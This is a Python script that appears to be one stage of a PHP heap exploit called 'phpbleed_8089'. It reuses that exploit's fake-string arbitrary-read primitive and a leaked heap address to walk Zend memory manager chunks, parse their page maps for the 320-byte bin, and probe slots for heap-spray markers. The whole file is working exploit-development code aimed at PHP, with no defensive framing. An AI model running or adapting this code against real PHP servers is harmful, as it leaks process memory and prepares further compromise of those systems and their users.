#!/usr/bin/env python3
"""R-6 diagnostic: walk ZMM chunks from the heap leak, dump bin-320 SRUN
pages across ALL chunks, probe slots, and show what's actually in them.
Uses the phpbleed_8089 primitives + state (resumable phases R-1..R-5)."""
import json
import struct
import sys
import importlib.util

spec = importlib.util.spec_from_file_location('pb', 'phpbleed_8089.py')
pb = importlib.util.module_from_spec(spec)
spec.loader.exec_module(pb)

st = json.load(open(pb.STATE_FILE))
heap_ref = st['heap_ref']
print(f"state heap_ref = {heap_ref:#x}")

assert pb.pin_open(), "pin open failed"

def read(addr, tag):
    r = pb.isstring_read(addr, pinned=True)
    if r is None:
        print(f"  {tag} @ {addr:#x}: CRASH/None")
        return None
    slen, data = r
    print(f"  {tag} @ {addr:#x}: len={slen} head={data[:24].hex()}")
    return r

MAP_OFF = 0x1F8

def dump_chunk(base, label, max_pages=512):
    print(f"[chunk {label}] base={base:#x}")
    r = read(base + 0x40, 'meta')
    if r is None or r[0] < MAP_OFF + 512 * 4:
        print(f"  map read insufficient (len={r[0] if r else None})")
        return []
    cdata = r[1]
    # chunk list pointers
    nxt = struct.unpack_from('<Q', cdata, 0x18 - 0x18 + 0)[0] if len(cdata) >= 8 else 0
    # data starts at base+0x58 (fake string at base+0x40 => data at +0x58)
    # so chunk+0x00 (next ptr) is at data offset -0x58... not in window; read separately
    rn = read(base + 0x00 - 0x10 + 0x10, 'next-ptr-read')  # reads len at base+0x10
    # ^ careful: isstring_read(base) reads len=*(base+0x10), data from base+0x18
    # we want *(base+0x00): use fake=base-0x18 -> len=*(base-0x8), data from base
    pages = []
    for pn in range(1, max_pages):
        info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
        is_srun = (info & 0x80000000) != 0
        is_lrun = (info & 0x40000000) != 0
        if is_srun and not is_lrun and (info & 0x1F) == 16:
            pages.append((pn, (info >> 16) & 0x1FF))
    print(f"  bin-320 SRUN pages: {pages}")
    return pages

def probe_pages(base, pages, nslots=12):
    for pn, fc in pages:
        run_start = base + pn * 0x1000
        print(f"[probe page {pn} free={fc}] @ {run_start:#x}")
        for slot in list(range(0, nslots)):
            addr = run_start + slot * 320
            r = pb.isstring_read(addr, pinned=True)
            if r is None:
                print(f"  slot {slot}: CRASH")
                continue
            slen, data = r
            mark = ' <<< SPRAY' if slen == pb.SPRAY_LEN else ''
            print(f"  slot {slot}: len={slen}{mark} head={data[:16].hex()}")

# 1. main chunk
chunk = heap_ref & ~0x1FFFFF
pages = dump_chunk(chunk, 'main')
probe_pages(chunk, pages)

# 2. walk chunk list (next ptr at chunk+0x00)
r = pb.isstring_read(chunk - 0x18, pinned=True)
if r:
    slen, data = r
    # data starts at (chunk-0x18)+0x18 = chunk; next ptr = data[0:8]
    nxt = struct.unpack_from('<Q', data, 0)[0]
    prv = struct.unpack_from('<Q', data, 8)[0]
    print(f"[chunk list] next={nxt:#x} prev={prv:#x}")
    seen = {chunk}
    cn = nxt
    hops = 0
    while cn and cn not in seen and hops < 6:
        seen.add(cn)
        cbase = cn & ~0x1FFFFF
        if cbase == 0 or cbase > pb.ADDR_MAX:
            break
        pages = dump_chunk(cbase, f'next-{hops+1}')
        probe_pages(cbase, pages)
        rr = pb.isstring_read(cbase - 0x18, pinned=True)
        if not rr:
            break
        cn = struct.unpack_from('<Q', rr[1], 0)[0]
        hops += 1

pb.pin_close()
print("done")
